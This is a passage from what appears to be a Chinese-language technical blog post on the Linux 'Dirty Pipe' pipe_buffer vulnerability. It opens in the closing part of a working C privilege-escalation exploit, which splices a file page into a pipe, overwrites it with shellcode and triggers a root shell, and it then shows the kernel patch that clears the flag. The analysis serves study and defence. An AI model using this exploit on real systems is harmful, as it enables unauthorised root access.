</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[+] Flag setting has been done.</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">     * Use the splice to make the pipe_buffer-&gt;page
</span><span style="color:#65737e;">     * become the page of the file mapped, by read
</span><span style="color:#65737e;">     * a byte from the file accross the splice
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[34m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[*] Reading a byte from the file by splice.</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    offset_in_file--;   </span><span style="color:#65737e;">// we read a byte, so offset should minus 1
</span><span style="color:#c0c5ce;">    retval = </span><span style="color:#8fa1b3;">splice</span><span style="color:#c0c5ce;">(target_file_fd, &amp;offset_in_file, pipe_fd[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(retval &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">splice failed!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(retval == </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">short splice!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[+] File splice done.</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#65737e;">/*
</span><span style="color:#65737e;">     * Now it comes to the time of exploit:
</span><span style="color:#65737e;">     * the mapped page of file has been in pipe_buffer,
</span><span style="color:#65737e;">     * and the PIPE_BUF_FLAG_CAN_MERGE is still set,
</span><span style="color:#65737e;">     * just a simple write can make the exploit.
</span><span style="color:#65737e;">     */
</span><span style="color:#c0c5ce;">    retval = </span><span style="color:#8fa1b3;">write</span><span style="color:#c0c5ce;">(pipe_fd[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], &amp;shellcode[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">], shellcode_len);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(retval &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Write failed!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else if </span><span style="color:#c0c5ce;">(retval &lt; shellcode_len)
</span><span style="color:#c0c5ce;">        </span><span style="color:#8fa1b3;">errExit</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">Short write!</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[32m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[+] EXPLOIT DONE!</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">puts</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[34m</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[1m[*] Trigger root shell...</span><span style="color:#96b5b4;">\033</span><span style="color:#a3be8c;">[0m</span><span style="color:#c0c5ce;">&quot;);
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">system</span><span style="color:#c0c5ce;">(argv[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]);
</span><span style="color:#c0c5ce;">}
</span></pre>
<h2 id="lou-dong-xiu-fu">漏洞修复</h2><p>添加上将<code>pipe_buffer</code>的flag置0，在<code>copy_page_to_iter_pipe</code>和<code>push_pipe</code>两个函数添加了置0代码</p>
<p>push_pipe 函数用来将数据通过迭代器写入管道，先把对应 pipe_buffer 写满，如果还有没写完的，再循环分配新<code>pipe_buffer</code>直到写完数据或者管道已满或内存页分配失败</p>
<pre style="background-color:#2b303b;">
<span style="color:#c0c5ce;">diff --git a/lib/iov_iter.</span><span style="color:#bf616a;">c</span><span style="color:#c0c5ce;"> b/lib/iov_iter.</span><span style="color:#bf616a;">c
</span><span style="color:#c0c5ce;">index b0e0acdf96c1</span><span style="background-color:#bf616a;color:#2b303b;">..</span><span style="color:#c0c5ce;">6dd5330f7a99 </span><span style="color:#d08770;">100644
</span><span style="color:#c0c5ce;">--- a/lib/iov_iter.</span><span style="color:#bf616a;">c
</span><span style="color:#c0c5ce;">+++ b/lib/iov_iter.</span><span style="color:#bf616a;">c
</span><span style="color:#c0c5ce;">@@ -</span><span style="color:#d08770;">414</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">6 </span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">414</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;"> @@ </span><span style="color:#b48ead;">static </span><span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">copy_page_to_iter_pipe</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> page *page, size_t offset, size_t by
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    buf-&gt;ops = &amp;page_cache_pipe_buf_ops;
</span><span style="color:#c0c5ce;">+   buf-&gt;flags = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">    </span><span style="color:#8fa1b3;">get_page</span><span style="color:#c0c5ce;">(page);
</span><span style="color:#c0c5ce;">    buf-&gt;page = page;
</span><span style="color:#c0c5ce;">    buf-&gt;offset = offset;
</span><span style="color:#c0c5ce;">@@ -</span><span style="color:#d08770;">577</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">6 </span><span style="color:#c0c5ce;">+</span><span style="color:#d08770;">578</span><span style="color:#c0c5ce;">,</span><span style="color:#d08770;">7</span><span style="color:#c0c5ce;"> @@ </span><span style="color:#b48ead;">static </span><span style="color:#c0c5ce;">size_t </span><span style="color:#8fa1b3;">push_pipe</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">struct</span><span style="color:#c0c5ce;"> iov_iter *i, size_t size,
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">break</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        buf-&gt;ops = &amp;default_pipe_buf_ops;
</span><span style="color:#c0c5ce;">+       buf-&gt;flags = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        buf-&gt;page = page;
</span><span style="color:#c0c5ce;">        buf-&gt;offset = </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;
</span><span style="color:#c0c5ce;">        buf-&gt;len = </span><span style="color:#8fa1b3;">min_t</span><span style="color:#c0c5ce;">(ssize_t, left, PAGE_SIZE);
</span></pre>
</main>
                <aside class="toc-sidebar">
                    <div class="toc-sticky-container">
                        <div class="toc-header">:: Contents ::</div>
                        <ul class="toc-list"><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#pipe">pipe</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#slice">slice</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#cong-wen-jian-du-qu-dao-guan-dao">从文件读取到管道</a></li><li class="toc-item toc-h3" data-level="3" style="margin-left:12px"><a href="#cong-guan-dao-du-qu-dao-wen-jian">从管道读取到文件</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#lou-dong-fen-xi">漏洞分析</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#lou-dong-li-yong">漏洞利用</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#poc">poc</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#ti-quan">提权</a></li><li class="toc-item toc-h2" data-level="2" style="margin-left:12px"><a href="#lou-dong-xiu-fu">漏洞修复</a></li></ul>
                    </div>
                </aside>
            </div> 
    <footer style="margin-top: 50px; border-top: 1px solid #333; padding-top: 20px; font-size: 0.8rem; color: #555; text-align: center;">
        Built with Rust. <span style="color: #66ed59;">EOF</span>
    </footer>
    <button id="back-to-top" aria-label="Back to Top">^TOP</button>
    <script src="script.js"></script>
</body>
</html>